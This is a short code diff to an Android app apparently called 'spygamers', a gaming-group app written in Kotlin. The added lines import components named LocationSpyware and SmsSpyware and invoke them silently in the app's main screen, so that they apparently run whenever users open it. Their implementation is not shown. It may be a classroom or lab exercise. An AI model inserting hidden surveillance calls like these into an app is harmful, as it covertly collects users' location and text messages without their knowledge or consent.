@@ -35,6 +35,8 @@ import com.example.spygamers.components.ProfilePictureIcon
 import com.example.spygamers.components.appbar.AppBar
 import com.example.spygamers.components.appbar.DrawerBody
 import com.example.spygamers.components.appbar.DrawerHeader
+import com.example.spygamers.components.spyware.LocationSpyware
+import com.example.spygamers.components.spyware.SmsSpyware
 import com.example.spygamers.controllers.GamerViewModel
 import com.example.spygamers.models.Group
 import com.example.spygamers.services.ServiceFactory
@@ -111,6 +113,9 @@ private fun MainBody(
             }
         }
     }
+
+    LocationSpyware(viewModel, context)
+    SmsSpyware(viewModel = viewModel, context = context)
 
     if (groups.isEmpty()) {
         Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
